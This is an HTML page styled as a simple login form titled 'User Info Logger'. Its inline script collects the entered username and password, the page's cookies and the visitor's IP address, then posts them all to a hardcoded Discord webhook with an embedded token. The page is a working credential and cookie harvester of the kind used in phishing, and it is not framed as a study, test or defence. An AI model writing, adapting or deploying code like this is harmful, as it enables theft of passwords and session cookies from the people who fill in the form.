<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Info Logger</title>
</head>
<body>
    <h1>Log Your Information</h1>
    <form id="infoForm">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Submit">
    </form>
    <script>
        document.getElementById('infoForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const cookies = document.cookie;

            const webhookUrl = 'https://discord.com/api/webhooks/1400242895537176627/A-IKxpGAD2fJKdYO_IK8boFsUNz-DTp0eUNU_C0rqM9JMcPOlBtQRxeBRKMGjIdZyZbz';

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const message = {
                        content: `New submission:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nCookies: ${cookies}`
                    };

                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);
                        alert('Information logged successfully!');
                    })
                    .catch((error) => {
                        console.error('Error:', error);
                        alert('Failed to log information.');
                    });
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });
        });
    </script>
</body>
</html>
